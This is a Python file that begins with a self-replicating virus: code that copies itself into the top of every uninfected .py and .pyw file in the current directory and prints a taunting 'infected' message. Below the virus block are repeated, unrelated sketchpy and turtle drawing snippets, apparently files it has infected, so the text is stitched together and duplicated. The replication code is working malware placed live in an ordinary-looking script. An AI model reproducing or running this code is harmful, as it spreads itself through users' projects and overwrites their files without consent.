# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!

from sketchpy import library as lib

sketch = lib.tom_holland()
sketch.draw()
from sketchpy import library as lib

sketch = lib.tom_holland()
sketch.draw()
from sketchpy import library as lib

sketch = lib.tom_holland()
sketch.draw()
from sketchpy import library as lib

sketch = lib.tom_holland()
sketch.draw()
import turtle

def main():
    screen = turtle.Screen()
    screen.bgcolor("black")

    t = turtle.Turtle()
    t.speed(0)
    t.color("white")

    for i in range(50):
        for colors in ["red", "orange", "yellow", "green", "blue", "purple"]:
            t.color(colors)
            t.circle(100)
            t.left(10)

    turtle.done()

if __name__ == '__main__':
    main()

import turtle

def main():
    screen = turtle.Screen()
    screen.bgcolor("black")

    t = turtle.Turtle()
    t.speed(0)
    t.color("white")

    for i in range(50):
        for colors in ["red", "orange", "yellow", "green", "blue", "purple"]:
            t.color(colors)
            t.circle(100)
            t.left(10)

    turtle.done()

if __name__ == '__main__':
    main()

import turtle

screen = turtle.Screen()
screen.bgcolor("black")

t = turtle.Turtle()
t.speed(0)
t.color("white")

for i in range(50):
    for colors in ["red", "orange", "yellow", "green", "blue", "purple"]:
        t.color(colors)
        t.circle(100)
        t.left(10)

turtle.done()

import turtle
a = turtle.Turtle()
print(a.shape())
import turtle
a = turtle.Turtle()
print(a.shape())